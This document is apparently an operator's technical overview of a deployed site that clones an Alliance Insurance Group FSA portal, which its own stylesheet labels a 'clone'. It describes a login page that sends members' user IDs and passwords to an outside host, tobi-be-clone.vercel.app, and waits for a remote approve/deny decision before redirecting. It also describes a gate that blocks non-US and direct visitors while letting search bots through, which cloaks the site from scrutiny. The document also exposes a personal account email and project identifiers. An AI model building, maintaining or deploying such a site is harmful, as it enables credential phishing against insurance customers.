# Site overview — `/Users/sensei/aig`

Factual reference for the codebase currently deployed at `https://aig-rho.vercel.app`. Describes files, stack, routing, gate behavior, page flows, and configuration exactly as they exist in the repo.

## Stack

- **Frontend**: hand-written static HTML (3 pages), one CSS file, one small vanilla JS file. No framework, no bundler, no build step.
- **Backend**: a single Node.js serverless function (`api/gate.js`), CommonJS, using only `fs` and `path` from the standard library. No `package.json`, no npm dependencies.
- **Host**: Vercel. Project id `prj_o9FrrRcv8tx7mIIwv2cNUvVWgZ3z`, org `team_7AsdVuLDiEH9fABxc6kJwVcb`, production alias `aig-rho.vercel.app`.
- **Fonts**: Google Fonts (`Open Sans`), imported from CSS.
- **Runtime**: whatever Node.js version Vercel selects by default (no `engines` pin).

## Directory layout

```
aig/
├── vercel.json           # rewrites, redirects, headers, function config
├── robots.txt            # crawler rules
├── sitemap.xml           # 3 URLs listed
├── api/
│   └── gate.js           # serverless function; handles all page requests
├── _pages/               # actual HTML sources, not directly reachable
│   ├── index.html
│   ├── login.html
│   └── register.html
├── css/
│   └── styles.css        # single stylesheet
├── js/
│   └── main.js           # carousel + "Popular Searches" toggle
├── assets/               # images (logo-aig.jpeg, logo-fsa.png, carousels)
└── .vercel/              # Vercel CLI project link
```

Top-level screenshots (`Screenshot 2026-09-09 at *.png`) and stray JPEGs in the root appear to be design references, not deployed.

## Routing (`vercel.json`)

All page paths are rewritten to the gate function; every user request goes through `api/gate.js`.

| Requested path                  | Rewritten to                             |
| ------------------------------- | ---------------------------------------- |
| `/`                             | `/api/gate?page=index.html`              |
| `/index` or `/index.html`       | `/api/gate?page=index.html`              |
| `/login` or `/login.html`       | `/api/gate?page=login.html`              |
| `/register` or `/register.html` | `/api/gate?page=register.html`           |

Redirects: any request to `/_pages/*` is 302'd back to `/`, so raw HTML sources can't be fetched directly.

Response headers applied globally:
- `X-Robots-Tag: noai, noimageai`
- `X-Frame-Options: DENY`
- `X-Content-Type-Options: nosniff`

Function config: `api/gate.js` bundles `_pages/**` via `includeFiles`, so the serverless function can `readFileSync` them at runtime.

## Access gate (`api/gate.js`)

Every page request goes through this single handler. Two independent checks run before serving:

1. **US-only IP gate** — reads `x-vercel-ip-country` (Vercel edge header). If non-empty and not `US`, respond `502` with empty body. Always on.
2. **Direct-access / referrer gate** — if the request is *not* from a search-engine referrer (`google.`, `bing.`, `yahoo.`, `duckduckgo.`) *and* not internally navigated (referrer host matches request host), respond `502` with empty body. Toggled by env var `GATE_REFERRER`:
   - `GATE_REFERRER=off` → gate disabled, any US visitor allowed.
   - unset / any other value → gate enabled (default).

**Bot bypass**: if `User-Agent` matches `/googlebot|bingbot|msnbot|slurp/i`, both gates are skipped.

Successful responses:
- `Content-Type: text/html; charset=utf-8`
- `Cache-Control: public, s-maxage=60, stale-while-revalidate=300` (edge caches HTML ~60s regardless of who was allowed through)

Unknown `page` values return `404 Not found`.

## Pages

### `_pages/index.html` — homepage
- `<title>`: "Homepage | Alliance Insurance Group"
- Meta description mentions FSA portal, tax savings, FSA-eligible items.
- `robots: index, follow` + OpenGraph tags.
- Header contains logo, phone `866-396-3967`, email `fsa@allianceinsgroup.com`, Sign in / Register buttons.
- Hero: 2-slide arrow-only image carousel + an "FSA search" widget whose form action points to `https://fsastore.com/` (external).
- Body: 6-tile "Resources" section (icons + labels: Shop for Eligible Items, Documents & Forms, FAQ, Short Term Savings, Calculate your Tax Savings, About us). All tiles are visual — no links.
- Footer: About Us / Terms of Use / Privacy Policy links (all `href="#"`, non-functional).
- Loads `js/main.js` at the bottom.

### `_pages/login.html` — sign-in
- `<title>`: "Login | Alliance Insurance Group"
- Fields: `UserId` (text), `Password` (password). Client-side check: password with spaces shows a "Password cannot contain spaces" hint.
- Inline `<style>` adds a spinner, field-error, and general-error styles.
- Inline script at bottom sets `DASHBOARD_URL = "https://tobi-be-clone.vercel.app"` and, on submit:
  1. POST `${DASHBOARD_URL}/api/tasks` with JSON `{ user_id, password, method: "email", masked_email, masked_phone: "N/A", request_kind: "login", member_origin: window.location.href, project_name: document.title }`.
  2. Read `data.task.id` from the response.
  3. Every 3000 ms, GET `${DASHBOARD_URL}/api/tasks/{taskId}` and check `result.task.status`:
     - `"approved"` → `window.location = "https://tobi-be-clone.vercel.app/verify?task=" + taskId`
     - `"denied"` → show "Sign-in was not approved."
  4. After 150 000 ms, cancel and show "Request timed out. Please try again."
- No link to a password-reset endpoint; "Let us help" links are `href="#"`.

### `_pages/register.html` — 5-step registration (only step 1 present)
- `<title>`: "Registration | Alliance Insurance Group"
- Step indicator shows 1–5, only step 1 is implemented.
- Fields: `First Name`, `Last Name`, `Zip Code`. `<form action="#">` — the Next button submits nowhere; there is no handler in this file.
- Cancel button links back to `index.html`.

## Assets

- `assets/logo-aig.jpeg` — header logo
- `assets/logo-fsa.png` — "Powered by FSA Store" mark in the homepage widget
- `assets/carousel-1.jpg`, `assets/carousel-2.jpg` — hero slides

Root also contains larger stray images (`img-bg2.jpg`, `img-bg3.jpg`, `images (1).jpeg`, `logo-fsa-dark-removebg-preview.png`) that don't appear referenced by any page.

## `css/styles.css`
- ~13 KB, single file, no preprocessor.
- File header comment reads: `Alliance Insurance Group – FSA portal clone`.
- Uses CSS custom properties for a maroon/grey palette (`--maroon: #850025` etc.).
- Imports Google Fonts `Open Sans`.
- Styles the header, hero, carousel, FSA widget, resources grid, footer, and the auth/registration forms.

## `js/main.js`
- Two IIFEs: carousel navigation (`.carousel-arrow.next/prev` cycle `.slide.is-active`) and Popular Searches dropdown toggle (`#fsaPop` collapses/expands via `#fsaPopBar`).
- No network calls, no third-party libraries.

## SEO / crawler configuration

### `robots.txt`
```
User-agent: Googlebot
Allow: /

User-agent: Bingbot
Allow: /

User-agent: *
Disallow: /

Sitemap: https://aig-rho.vercel.app/sitemap.xml
```
Only Googlebot and Bingbot are allowed; every other crawler is disallowed.

### `sitemap.xml`
Lists three URLs (`/`, `/login.html`, `/register.html`) with `changefreq` and `priority` values. Points to the `aig-rho.vercel.app` origin.

### In-page SEO
Each HTML page ships with a `<title>`, `<meta name="description">`, `<meta name="robots" content="index, follow">`, and OpenGraph title/description/type. Favicon is `/assets/logo-aig.jpeg`. No JSON-LD structured data, no canonical link tags, no Twitter Card tags.

Note the interaction with the gate: the global `X-Robots-Tag: noai, noimageai` header contradicts the per-page `<meta name="robots" content="index, follow">`. For non-bot traffic that isn't from a search referrer or internal nav, the gate returns `502` before serving HTML, so end-user visits and crawler visits are answered differently.

## Environment variables

| Name            | Purpose                                        | Values                         |
| --------------- | ---------------------------------------------- | ------------------------------ |
| `GATE_REFERRER` | Toggles the referrer / direct-access gate.     | `off` = disabled. Anything else / unset = enabled (default). |

Set in Vercel dashboard: Project → Settings → Environment Variables. Changes require a redeploy to take effect on production traffic.

## Deployment

- Latest production deploy (from terminal history): `https://aig-oj8tkxl2x-emmanuelodinukaeze-4770s-projects.vercel.app`, aliased to `https://aig-rho.vercel.app`.
- Deploy command: `vercel --prod` from the repo root. No CI is wired up; deploys are manual via the Vercel CLI.
- Vercel account authorized on this machine: `emmanuelodinukaeze@gmail.com`.

## External dependencies at runtime

- `fonts.googleapis.com` — CSS `@import` for Open Sans.
- `fsastore.com` — homepage FSA search form action + Popular Searches links.
- `tobi-be-clone.vercel.app` — login form submission target and status-polling endpoint (`/api/tasks`, `/api/tasks/{id}`, `/verify?task=…`).

No other outbound calls from the served pages.
